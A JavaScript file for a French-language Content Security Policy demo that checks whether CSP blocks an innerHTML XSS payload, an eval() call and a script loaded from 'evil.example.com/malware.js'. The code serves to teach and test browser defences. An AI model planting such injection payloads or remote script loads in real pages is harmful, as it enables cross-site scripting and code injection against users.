// =============================================================
// app.js - Script EXTERNE autorise par CSP (source: 'self')
// =============================================================

document.addEventListener("DOMContentLoaded", function () {
    console.log("[CSP Demo] Script externe charge avec succes (source: 'self')");

    // Afficher le statut CSP
    updateCspStatus();

    // Bouton de test XSS
    const xssBtn = document.getElementById("btn-test-xss");
    if (xssBtn) {
        xssBtn.addEventListener("click", testXssInjection);
    }

    // Bouton pour tester eval()
    const evalBtn = document.getElementById("btn-test-eval");
    if (evalBtn) {
        evalBtn.addEventListener("click", testEval);
    }

    // Bouton pour tester chargement script externe
    const extBtn = document.getElementById("btn-test-external");
    if (extBtn) {
        extBtn.addEventListener("click", testExternalScript);
    }

    // Bouton pour voir les en-tetes
    const headersBtn = document.getElementById("btn-show-headers");
    if (headersBtn) {
        headersBtn.addEventListener("click", showHeaders);
    }
});

function log(message, type) {
    const console_el = document.getElementById("console-output");
    const line = document.createElement("div");
    line.className = "console-line " + (type || "");
    const time = new Date().toLocaleTimeString("fr-FR");
    line.textContent = `[${time}] ${message}`;
    console_el.appendChild(line);
    console_el.scrollTop = console_el.scrollHeight;
}

function updateCspStatus() {
    fetch(window.location.href, { method: "HEAD" })
        .then(function (response) {
            const csp = response.headers.get("Content-Security-Policy");
            const cspRo = response.headers.get("Content-Security-Policy-Report-Only");
            const statusEl = document.getElementById("csp-status");

            if (csp) {
                statusEl.textContent = "ENFORCE";
                statusEl.className = "status-badge enforce";
                log("Mode CSP: ENFORCE - Les violations sont BLOQUEES", "success");
            } else if (cspRo) {
                statusEl.textContent = "REPORT-ONLY";
                statusEl.className = "status-badge report-only";
                log("Mode CSP: REPORT-ONLY - Les violations sont signalees mais pas bloquees", "warning");
            } else {
                statusEl.textContent = "DESACTIVE";
                statusEl.className = "status-badge disabled";
                log("CSP est DESACTIVE - Aucune protection !", "error");
            }
        });
}

// Test 1 : Injection XSS via innerHTML
function testXssInjection() {
    log("--- Test XSS : injection de script via innerHTML ---", "info");
    const target = document.getElementById("xss-target");
    const payload = '<img src=x onerror="alert(\'XSS\')">';

    log("Payload injecte: " + payload, "warning");
    target.innerHTML = payload;

    // Le onerror sera bloque par CSP car c'est un inline event handler
    log("Si CSP est actif, le handler onerror est bloque par la directive script-src", "success");
    log("Ouvrez la console du navigateur (F12) pour voir la violation CSP", "info");
}

// Test 2 : eval()
function testEval() {
    log("--- Test eval() ---", "info");
    try {
        // eslint-disable-next-line no-eval
        eval("document.title = 'Pirate!'");
        log("eval() a fonctionne ! CSP n'est pas assez restrictif (unsafe-eval present ?)", "error");
    } catch (e) {
        log("eval() BLOQUE par CSP : " + e.message, "success");
    }
}

// Test 3 : chargement de script externe non autorise
function testExternalScript() {
    log("--- Test chargement script externe non autorise ---", "info");
    const script = document.createElement("script");
    script.src = "https://evil.example.com/malware.js";

    script.onerror = function () {
        log("Chargement BLOQUE - le domaine n'est pas dans script-src", "success");
    };

    script.onload = function () {
        log("Script externe charge ! CSP n'a pas bloque le domaine", "error");
    };

    document.head.appendChild(script);
    log("Tentative de chargement de https://evil.example.com/malware.js ...", "warning");
}

// Afficher les en-tetes de securite
function showHeaders() {
    log("--- En-tetes de securite ---", "info");
    fetch(window.location.href, { method: "HEAD" })
        .then(function (response) {
            var securityHeaders = [
                "Content-Security-Policy",
                "Content-Security-Policy-Report-Only",
                "X-Content-Type-Options",
                "X-Frame-Options",
                "Referrer-Policy"
            ];

            securityHeaders.forEach(function (header) {
                var value = response.headers.get(header);
                if (value) {
                    log(header + ": " + value, "success");
                } else {
                    log(header + ": (absent)", "warning");
                }
            });
        });
}
